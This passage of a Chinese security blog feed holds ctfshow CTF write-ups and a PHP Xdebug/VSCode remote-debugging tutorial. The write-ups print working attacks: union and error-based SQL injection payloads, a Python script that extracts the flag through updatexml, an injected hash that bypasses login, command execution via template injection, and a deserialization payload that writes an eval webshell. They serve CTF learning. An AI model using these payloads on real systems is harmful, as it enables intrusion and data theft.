模板注入</h2><p>这题其实是利用新增模板完成模板注入。</p><p>首先查看模板渲染<code>render/render_class.php</code>，发现增加了危险函数，可以利用危险参数。</p><p>利用SQL注入危险的数据</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">username</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 union select <span class="hljs-string">&#x27;`cat /f*`&#x27;</span>, <span class="hljs-string">&#x27;`cat /f*`&#x27;</span> , <span class="hljs-string">&#x27;admin&#x27;</span>#&amp;<span class="hljs-attribute">password</span>=123<br></code></pre></td></tr></table></figure><p>创建新的模板</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0029/image-20230406000741715.png" alt="image-20230406000741715" /></p><p>访问对应的路由实现RCE</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?action=<span class="hljs-keyword">view</span>&amp;page=<span class="hljs-built_in">new</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctfshow</tag>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP+VSCode Server+SSH远程调试教程</title>
    <link href="/2022/10/20/blog0027-PHP-VScode-Server-SSH%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E6%95%99%E7%A8%8B/"/>
    <url>/2022/10/20/blog0027-PHP-VScode-Server-SSH%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>PHP在Linux下的调试环境一直没怎么配好，今天记录一下配置过程中的问题。</p><span id="more"></span><h2 id="一环境配置">一、环境配置</h2><ol type="1"><li><p>PHP</p><p>版本不限，我使用的PHP7.3</p></li><li><p>Debian 服务器</p><p>不同Linux发行版，部分的操作可能不一致，但实现的目标是一致的.</p></li><li><p>VSCode</p></li></ol><h2 id="二xebug配置">二、Xebug配置</h2><h3 id="安装xdebug">安装Xdebug</h3><p>在Debian服务器上安装Xdebug，打开phpinfo页面，<code>Ctrl+U</code>获取页面HTML代码</p><p><a href="https://xdebug.org/wizard">Xdebug官方指南</a></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221020005835380.png" alt="image-20221020005835380" style="zoom:50%;" /></p><p>对应的信息输入进去后，能够得到要下载的版本以及安装的步骤。</p><p>下载对应压缩包后，完成如下指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt-get install php-dev autoconf automake <br>tar -xvzf &#123;your-debug-zip&#125;.tgz<br>./configure<br>make<br>cp modules/xdebug.so /usr/lib/php/20180731<br></code></pre></td></tr></table></figure><h3 id="配置php.ini">配置php.ini</h3><p>php.ini的路径可以在phpinfo中找到</p><p>进入对应文件后，做出如下修改</p><p>要记住<code>port</code>，这在后续VSCode调试中需要用到</p><p><code>connect_timeout_ms</code>这个参数修改之后，每次调试的时间长一些，默认是200s（这显然不够orz）</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221020010943425.png" alt="image-20221020010943425" style="zoom:67%;" /></p><p>做完这些后，记得重启网络服务</p><p>Debian下的LAMP是</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">service apache2 restart<br></code></pre></td></tr></table></figure><p>重启后打开phpinfo，能够看到Xdebug信息已经出现了</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221020011306322.png" alt="image-20221020011306322" /></p><h2 id="三vscode配置">三、VSCode配置</h2><h3 id="安装remote-ssh">安装Remote-SSH</h3><p>这一步网上的教程很多</p><p>可以参考这一篇</p><p><a href="https://www.cnblogs.com/liyufeia/p/11405779.html">Remote-SSH插件安装</a></p><h3 id="安装vscode-server">安装VSCode-Server</h3><p>由于后续还需要在服务器上配置调试插件，这里我们需要在服务器上安装VSCode-Server</p><p>如果是带GUI的虚拟机，可以直接装一个VSCode，就不用这么复杂了</p><h4 id="获取commit-id">获取commit-id</h4><p>打开物理机的VSCode，查看自己的<code>commit-id</code></p><p><code>Help</code>-&gt;<code>About</code>处查看</p><p>然后<code>commit-id</code>替换入下方的链接</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/update.code.visualstudio.com/commit</span><span class="hljs-symbol">:commit_id/server-linux-x64/stable</span><br></code></pre></td></tr></table></figure><p>访问该链接，能够得到<code>vscode-server-linux-x64.tar.gz</code></p><h4 id="配置vscode-server">配置vscode-server</h4><p>进入服务器的用户目录<code>~</code>，创建文件夹<code>.vscode-server</code>，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir -p ~/.vscode-server/bin<br></code></pre></td></tr></table></figure><p>将压缩包拷贝入<code>~/.vscode-server/bin</code>，解压缩</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ~/.vscode-server/bin<br>tar -zxvf vscode-server-linux-x64.tar.gz<br></code></pre></td></tr></table></figure><p>将解压出的文件夹重命名为之前的<code>commit-id</code>，并在该目录下创建新文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ~/.vscode-server/bin/$commit-id<br>touch 0<br></code></pre></td></tr></table></figure><p>这样vscode-server就配置成功了</p><h3 id="安装vscode扩展">安装VSCode扩展</h3><p>VSCode远程连接上服务器，有两种方法安装插件，一种是直接在GUI界面安装</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221020201022982.png" alt="image-20221020201022982" style="zoom:50%;" /></p><p>还有一种方法是下载<code>.visx</code>文件，然后导入离线安装，我服务器不知道为什么没办法在线安装，选择的就是离线安装。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221020201143889.png" alt="image-20221020201143889" style="zoom:50%;" /></p><h3 id="配置launch.json">配置launch.json</h3><p>最后一步是需要配置launch.json文件，当你点击调试符号，VSCode会创建一个默认的调试文件。</p><p>有几处需要你自己改一下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-comment">// 使用 IntelliSense 了解相关属性。 </span><br>    <span class="hljs-comment">// 悬停以查看现有属性的描述。</span><br>    <span class="hljs-comment">// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387</span><br>    <span class="hljs-attr">&quot;version&quot;</span>: <span class="hljs-string">&quot;0.2.0&quot;</span>,<br>    <span class="hljs-attr">&quot;configurations&quot;</span>: [<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Listen for Xdebug&quot;</span>,<br>            <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;php&quot;</span>,<br>            <span class="hljs-attr">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,<br>            <span class="hljs-attr">&quot;port&quot;</span>: <span class="hljs-number">9003</span><span class="hljs-comment">//填入之前选择的端口</span><br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Launch currently open script&quot;</span>,<br>            <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;php&quot;</span>,<br>            <span class="hljs-attr">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,<br>            <span class="hljs-attr">&quot;program&quot;</span>: <span class="hljs-string">&quot;$&#123;file&#125;&quot;</span>,<span class="hljs-comment">//你要调试的程序，可以不用修改</span><br>            <span class="hljs-attr">&quot;cwd&quot;</span>: <span class="hljs-string">&quot;$&#123;fileDirname&#125;&quot;</span>,<br>            <span class="hljs-attr">&quot;port&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-attr">&quot;runtimeArgs&quot;</span>: [<br>                <span class="hljs-string">&quot;-dxdebug.start_with_request=yes&quot;</span><br>            ],<br>            <span class="hljs-attr">&quot;env&quot;</span>: &#123;<br>                <span class="hljs-attr">&quot;XDEBUG_MODE&quot;</span>: <span class="hljs-string">&quot;debug,develop&quot;</span>,<br>                <span class="hljs-attr">&quot;XDEBUG_CONFIG&quot;</span>: <span class="hljs-string">&quot;client_port=$&#123;port&#125;&quot;</span><br>            &#125;<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Launch Built-in web server&quot;</span>,<br>            <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;php&quot;</span>,<br>            <span class="hljs-attr">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,<br>            <span class="hljs-attr">&quot;runtimeArgs&quot;</span>: [<br>                <span class="hljs-string">&quot;-dxdebug.mode=debug&quot;</span>,<br>                <span class="hljs-string">&quot;-dxdebug.start_with_request=yes&quot;</span>,<br>                <span class="hljs-string">&quot;-S&quot;</span>,<br>                <span class="hljs-string">&quot;localhost:9003&quot;</span><span class="hljs-comment">//注意这里需要将之前设置的端口填入</span><br>            ],<br>            <span class="hljs-attr">&quot;program&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-attr">&quot;cwd&quot;</span>: <span class="hljs-string">&quot;$&#123;workspaceRoot&#125;&quot;</span>,<br>            <span class="hljs-attr">&quot;port&quot;</span>: <span class="hljs-number">9003</span>,<span class="hljs-comment">//填入之前选择的窗口</span><br>            <span class="hljs-attr">&quot;serverReadyAction&quot;</span>: &#123;<br>                <span class="hljs-attr">&quot;pattern&quot;</span>: <span class="hljs-string">&quot;Development Server \\(http://localhost:([0-9]+)\\) started&quot;</span>,<br>                <span class="hljs-attr">&quot;uriFormat&quot;</span>: <span class="hljs-string">&quot;http://localhost:%s&quot;</span>,<br>                <span class="hljs-attr">&quot;action&quot;</span>: <span class="hljs-string">&quot;openExternally&quot;</span><br>            &#125;<br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="四调试测试">四、调试测试</h2><p>以上，我们就完成了VSCode+PHP+Remote SSH的远程调试了，接下来我们尝试一下</p><p>在服务器上部署代码</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221020201627397.png" alt="image-20221020201627397" style="zoom: 67%;" /></p><p>VSCode点击<code>F5</code>，进入调试界面</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221020201733199.png" alt="image-20221020201733199" style="zoom:67%;" /></p><p>在本地的浏览器远程防对应页面，成功进入断点</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221020201850380.png" alt="image-20221020201850380" /></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221020201824560.png" alt="image-20221020201824560" style="zoom:67%;" /></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境配置</tag>
      
      <tag>PHP</tag>
      
      <tag>VSCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-代码审计-wp</title>
    <link href="/2022/10/18/blog0026-ctfshow-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-wp/"/>
    <url>/2022/10/18/blog0026-ctfshow-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-wp/</url>
    
    <content type="html"><![CDATA[<p>锻炼一下代码审计的功力</p><p>CTF的Web现在越来越卷，要加强一下自己的代码审计能力了</p><span id="more"></span><h2 id="web301sql注入">1、Web301（SQL注入）</h2><p>非常简单，联合注入</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">123</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">123</span>;<span class="hljs-meta">#-- -</span><br></code></pre></td></tr></table></figure><h2 id="web302sql注入">2、Web302（SQL注入）</h2><p>这次的数据库存储密码是md5加密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sds_decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> md5(md5(<span class="hljs-variable">$str</span>.md5(base64_encode(<span class="hljs-string">&quot;sds&quot;</span>))).<span class="hljs-string">&quot;sds&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>检查登录的逻辑代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$userpwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;userpwd&#x27;</span>];<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select sds_password from sds_user where sds_username=&#x27;&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;&#x27; order by id limit 1;&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-variable">$mysqli</span>-&gt;query(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$row</span>=<span class="hljs-variable">$result</span>-&gt;fetch_array(MYSQLI_BOTH);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows&lt;<span class="hljs-number">1</span>)&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;error&#x27;</span>]=<span class="hljs-string">&quot;1&quot;</span>;<br>header(<span class="hljs-string">&quot;location:login.php&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment"># 输入的密码加密后与数据库中的查询结果相等</span><br><span class="hljs-keyword">if</span>(!strcasecmp(sds_decode(<span class="hljs-variable">$userpwd</span>),<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;sds_password&#x27;</span>]))&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>]=<span class="hljs-number">1</span>;<br><span class="hljs-variable">$result</span>-&gt;free();<br><span class="hljs-variable">$mysqli</span>-&gt;close();<br>header(<span class="hljs-string">&quot;location:index.php&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是代码审计还是不难的</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span> = <span class="hljs-number">123</span>&#x27; union select &#x27;ebc<span class="hljs-number">21</span>ce<span class="hljs-number">74</span>a<span class="hljs-number">2153</span>bbcf<span class="hljs-number">593</span>e<span class="hljs-number">4</span>f<span class="hljs-number">7</span>d<span class="hljs-number">61479</span>a&#x27;;#-- -<br><span class="hljs-attribute">password</span> = <span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p>顺利通过身份校验，获得flag</p><h2 id="web303报错注入">3、Web303（报错注入）</h2><p>这道题的主要考点是报错注入。</p><p>首先是登录页面，查看<code>sds_user.sql</code>文件，发现插入记录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- ----------------------------</span><br><span class="hljs-comment">-- Records of sds_user</span><br><span class="hljs-comment">-- ----------------------------</span><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `sds_user` <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;27151b7b1ad51a38ea66b1529cde5ee4&#x27;</span>);<br></code></pre></td></tr></table></figure><p>但是这里是加密过的密码，获取到了也无法获得明文，这时候基本上就只有弱密码爆破这条路了</p><p>但是非常巧的是，这里在源代码中留下来一个admin的加密结果，发现正好对应，因此直接猜测登录的账号密码是admin,admin.</p><p>尝试之后，直接登录，于是考虑新的攻击点。</p><p>这里新增了一个添加支行的选项，发现报错注入漏洞</p><p><code>dptadd.php</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">#<span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span>报错注入点<span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><br>$<span class="hljs-keyword">sql</span><span class="hljs-operator">=</span>&quot;insert into sds_dpt set sds_name=&#x27;&quot;.$dpt_name.&quot;&#x27;,sds_address =&#x27;&quot;.$dpt_address.&quot;&#x27;,sds_build_date=&#x27;&quot;.$dpt_build_year.&quot;&#x27;,sds_have_safe_card=&#x27;&quot;.$dpt_has_cert.&quot;&#x27;,sds_safe_card_num=&#x27;&quot;.$dpt_cert_number.&quot;&#x27;,sds_telephone=&#x27;&quot;.$dpt_telephone_number.&quot;&#x27;;&quot;;<br>$<span class="hljs-keyword">result</span><span class="hljs-operator">=</span>$mysqli<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>query($<span class="hljs-keyword">sql</span>);<br>echo $<span class="hljs-keyword">sql</span>;<br>if($<span class="hljs-keyword">result</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-literal">true</span>)&#123;<br>$mysqli<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span><span class="hljs-keyword">close</span>();<br>header(&quot;location:dpt.php&quot;);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br># 报错信息利用<br>die(mysqli_error($mysqli));<br>&#125;<br></code></pre></td></tr></table></figure><p>于是利用updatexml()函数，成功实现报错注入。</p><p><code>exp.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> http <span class="hljs-keyword">import</span> cookies<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://5c9bbe7d-3137-4393-8c1d-54a4d876e1b2.challenge.ctf.show//dptadd.php&quot;</span><br><br>Cookies = &#123;<br>    <span class="hljs-string">&quot;PHPSESSID&quot;</span>:<span class="hljs-string">&quot;1kn5lkfmgmhf5oh2jpl8fknncn&quot;</span><br>&#125;<br><br>data = &#123;<br>    <span class="hljs-string">&quot;dpt_name&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<br>    <span class="hljs-string">&quot;dpt_build_year&quot;</span>:<span class="hljs-string">&quot;2022-10-04&quot;</span>,<br>    <span class="hljs-string">&quot;dpt_has_cert&quot;</span>:<span class="hljs-string">&quot;on&quot;</span>,<br>    <span class="hljs-string">&quot;dpt_cert_number&quot;</span>:<span class="hljs-string">&quot;&#x27;,sds_telephone=char(updatexml(0,concat(0x7c,&#123;&#125;),1) + 1);#--&quot;</span>,<br>    <span class="hljs-string">&quot;dpt_telephone_number&quot;</span>:<span class="hljs-string">&quot;1&quot;</span><br>&#125;<br><br>payload = <span class="hljs-string">&quot;(select group_concat(table_name) from information_schema.tables where table_schema=database())&quot;</span><br><br>payload = <span class="hljs-string">&quot;(select group_concat(column_name) from information_schema.columns where table_name=&#x27;sds_fl9g&#x27;)&quot;</span><br><br>payload = <span class="hljs-string">&#x27;(select length(flag) from sds_fl9g LIMIT 0,1)&#x27;</span><br><br>proxies = &#123;<br>    <span class="hljs-string">&quot;http&quot;</span> : <span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_flag</span>():</span><br>    <span class="hljs-keyword">global</span> data<br>    s = <span class="hljs-string">&quot;&quot;</span> <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">46</span>,<span class="hljs-number">1</span>):<br>        payload_static = <span class="hljs-string">&quot;&#x27;,sds_telephone=char(updatexml(0,concat(0x7c,&#123;&#125;),1) + 1);#--&quot;</span><br>        <br>        payload = <span class="hljs-string">&#x27;(select substr(flag,&#123;&#125;,1) from sds_fl9g LIMIT 0,1)&#x27;</span>.<span class="hljs-built_in">format</span>(i)<br>        <span class="hljs-comment"># dict类型赋值传引用，attention！</span><br>        data[<span class="hljs-string">&#x27;dpt_cert_number&#x27;</span>] = payload_static.<span class="hljs-built_in">format</span>(payload)<br>        r = requests.post(  url=url,<br>                            data=data,<br>                            cookies=Cookies,<br>                            proxies=proxies<br>                        )<br>        s += r.text[-<span class="hljs-number">2</span>]<br>        <span class="hljs-built_in">print</span>(s)<br><br>get_flag();     <br><br><span class="hljs-comment"># 获取表名，列名等信息</span><br><span class="hljs-comment"># data[&#x27;dpt_cert_number&#x27;] = data[&#x27;dpt_cert_number&#x27;].format(payload)</span><br><br><span class="hljs-comment"># r = requests.post(  url=url,</span><br><span class="hljs-comment">#                     data=data,</span><br><span class="hljs-comment">#                     cookies=Cookies,</span><br><span class="hljs-comment">#                     proxies=proxies</span><br><span class="hljs-comment">#                 )</span><br><span class="hljs-comment"># print(r.text)</span><br><span class="hljs-comment"># print(&quot;*&quot;*50)</span><br><span class="hljs-comment"># print(r.text.split(&#x27;;&#x27;)[-1])</span><br><br></code></pre></td></tr></table></figure><h2 id="web304错误正则">4、Web304（错误正则）</h2><p>原理类似Web303，但是引入了全局waf</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sds_waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&#x27;/[0-9]|[a-z]|-/i&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这意味着我们输入字符串必须带有数字字母或者'-'符号，这属于错误的正则表达式。</p><p>直接利用上一题exp，可以直接通过。</p><h2 id="web305反序列化">5、Web305（反序列化）</h2><p>代码还是Web303的基础，发现了新增了php文件</p><p><code>class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;username=<span class="hljs-variable">$u</span>;<br><span class="hljs-keyword">$this</span>-&gt;password=<span class="hljs-variable">$p</span>;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>file_put_contents(<span class="hljs-keyword">$this</span>-&gt;username, <span class="hljs-keyword">$this</span>-&gt;password);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>尤其是析构函数，看着像是可以利用来写webshell样子。</p><p>发现可能点，开启全局搜索大法</p><p>顺利发现反序列化点，剩下的非常简单了</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221021145902324.png" alt="image-20221021145902324" style="zoom:67%;" /></p><p>于是构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br>    <span class="hljs-variable">$danger</span> = <span class="hljs-keyword">new</span> user(<span class="hljs-string">&quot;1.php&quot;</span>,<span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);highlight_file(__FILE__);&#x27;</span>);<br><br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$danger</span>));<br></code></pre></td></tr></table></figure><p>将结果写入浏览器的cookie中，并且尝试登录触发<code>checklogin.php</code></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221021150624567.png" alt="image-20221021150624567" 